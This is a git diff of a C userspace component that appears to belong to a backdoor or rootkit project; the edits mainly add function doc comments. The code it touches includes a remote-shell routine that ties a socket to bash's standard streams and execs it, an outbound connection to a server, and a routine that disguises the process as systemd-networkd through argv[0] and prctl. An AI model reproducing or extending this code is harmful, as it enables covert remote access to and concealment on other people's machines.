@@ -1,9 +1,10 @@
 /*
  * Author and Designer: John Agapeyev
- * Date: 2018-09-22
+ * Date: 2018-10-19
  * Notes:
  * The socket handling for userspace
  */
+
 #include <asm/types.h>
 #include <assert.h>
 #include <linux/tcp.h>
@@ -37,6 +38,19 @@ static unsigned char secret_key[KEY_LEN];
 #define SHELL_SOCK_PATH ("/var/run/my_remote_shell")
 #endif
 
+/*
+ * function:
+ *    wrapped_fork
+ *
+ * return:
+ *    pid_t
+ *
+ * parameters:
+ *    void
+ *
+ * notes:
+ * Simple wrapper around fork call
+ */
 pid_t wrapped_fork(void) {
     pid_t pid;
     if ((pid = fork()) == -1) {
@@ -46,6 +60,19 @@ pid_t wrapped_fork(void) {
     return pid;
 }
 
+/*
+ * function:
+ *    run_remote_shell
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    void
+ *
+ * notes:
+ * Connects to unix socket, and establishes it as input for standard streams before execing bash
+ */
 void run_remote_shell(void) {
     int remote_sock = socket(AF_UNIX, SOCK_STREAM, 0);
 
@@ -81,6 +108,19 @@ void run_remote_shell(void) {
     execve(sh[0], (char* const*) sh, 0);
 }
 
+/*
+ * function:
+ *    create_unix_socket
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    const char* sock_path
+ *
+ * notes:
+ * Creates a unix socket based on a path
+ */
 int create_unix_socket(const char* sock_path) {
     int local_tls_socket = socket(AF_UNIX, SOCK_STREAM, 0);
 
@@ -97,6 +137,19 @@ int create_unix_socket(const char* sock_path) {
     return local_tls_socket;
 }
 
+/*
+ * function:
+ *    create_remote_socket
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    void
+ *
+ * notes:
+ * Creates a remote socket and connects it to the server
+ */
 int create_remote_socket(void) {
     int remote_sock = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -112,12 +165,39 @@ int create_remote_socket(void) {
     return remote_sock;
 }
 
+/*
+ * function:
+ *    mask_process
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    char** argv
+ *    const char* process_mask
+ *
+ * notes:
+ * Masks a process by a given mask by modifying argv[0]
+ */
 void mask_process(char** argv, const char* process_mask) {
     memset(argv[0], 0, strlen(argv[0]));
     strcpy(argv[0], process_mask);
     prctl(PR_SET_NAME, process_mask, 0, 0);
 }
 
+/*
+ * function:
+ *    createEpollFd
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    void
+ *
+ * notes:
+ * Wrapper around epoll_create1()
+ */
 int createEpollFd(void) {
     int efd;
     if ((efd = epoll_create1(0)) == -1) {
@@ -127,6 +207,21 @@ int createEpollFd(void) {
     return efd;
 }
 
+/*
+ * function:
+ *    add_epoll_socket
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    const int epollfd
+ *    const int sock
+ *    struct epoll_event* ev
+ *
+ * notes:
+ * Wrapper around epoll_ctl
+ */
 void add_epoll_socket(const int epollfd, const int sock, struct epoll_event* ev) {
     if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, ev) == -1) {
         perror("epoll_ctl");
@@ -134,6 +229,20 @@ void add_epoll_socket(const int epollfd, const int sock, struct epoll_event* ev)
     }
 }
 
+/*
+ * function:
+ *    waitForEpollEvent
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    const int epollfd
+ *    struct epoll_event* events
+ *
+ * notes:
+ * Wrapper around epoll_wait
+ */
 int waitForEpollEvent(const int epollfd, struct epoll_event* events) {
     int nevents;
     if ((nevents = epoll_wait(epollfd, events, 100, -1)) == -1) {
@@ -155,12 +264,11 @@ int waitForEpollEvent(const int epollfd, struct epoll_event* events) {
  *    int
  *
  * parameters:
- *    void
+ *    int argc
+ *    char** argv
  *
  * notes:
- * Daemonizes and forks into encrypt, decrypt, and TLS sockets.
- * encrypt and decrypt are simply unix socket connections
- * TLS socket is a pure forwarder for the kernel module over TLS (since the kernel doesn't do TLS)
+ * Establishes a TLS session, forks into read and write processes, and forwards packets
  */
 int main(int argc, char** argv) {
     const char* mask_1 = "/usr/lib/systemd/systemd-networkd";
